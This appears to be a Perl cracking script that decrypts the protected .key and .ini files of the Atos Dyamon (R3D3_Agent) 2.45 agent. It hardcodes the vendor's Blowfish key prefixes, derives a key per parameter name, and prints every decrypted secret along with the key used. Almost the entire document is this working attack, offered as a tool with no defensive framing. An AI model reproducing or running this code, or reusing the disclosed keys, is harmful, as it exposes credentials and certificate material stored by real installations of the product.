#!/usr/bin/perl

## This cracks the .key and .ini file encryption for Atos Dyamon
## agent version 2.45. (Also known as R3D3_Agent) (www.atos.net)
## Author: Littleshack
## Sean Greathouse (sean.greathouse@gmail.com)

use Crypt::CBC;
use Crypt::Blowfish;
use Crypt::OpenSSL::RSA;

### This area decrypts the .key file
$inikey = 'D:\Tools\R3D3_Agent\R3D3_Agent.key';
$ini = 'D:\Tools\R3D3_Agent\R3D3_Agent.ini';

print "Decrypting the .key file..\n";
if (open(INI,$inikey))
{
  while(<INI>)
  {
    s/[\x0D\x0A]+$// ;  # universal chomp
    next if (/^ *#/);
    if (/^ *([^= ]+) *= *(.*)/)
    {
      ($alias,$param) 	= (uc($1),$2);
      if ($param =~ /^{Crypted}(.*)$/)
      {
        my $encrypted = $1;
        #print "Encrypted is: $encrypted\n";
        my $key = 'R3D3MAJ CERTIFICATES'.$alias;
        print "Decrypting $alias\n";
        print "Key is: $key\n";
        my %cipherarg = (
          -key    => $key,
          -cipher => 'Blowfish',
          );
        my $cipher = Crypt::CBC->new(%cipherarg);
        my $decrypted = $cipher->decrypt_hex($encrypted);
        print "Decrypted is:\n $decrypted\n";
        my $ciphertext = $cipher->finish();
        
      }
    }
  }
}
close(INI);


print "Decrypting the INI file now...\n";

if (open(INI,$ini))
{
  while(<INI>)
  {
    s/[\n\r]+$//;
    next if (/^ *#/);
    if (/^ *([^= ]+) *= *(.*)/)
      {
        ($alias,$param) = (uc($1),$2);
        if ($param =~ /^{Crypted}(.*)$/)
        {
          my $encrypted = $1;
          print "Encrypted is: $encrypted\n";
          my $key = 'r3DdD_2012-Dyam0n'.$alias;
          print "Key is $key\n";
          my %cipherarg = (
            -key    => $key,
            -cipher => 'Blowfish',
            );
          my $cipher = Crypt::CBC->new(%cipherarg);
          my $decrypted = $cipher->decrypt_hex($encrypted);
          print "Decrypted is $decrypted\n";
          my $ciphertext = $cipher->finish();
          
        }
      }
  }
}
close(INI);
 
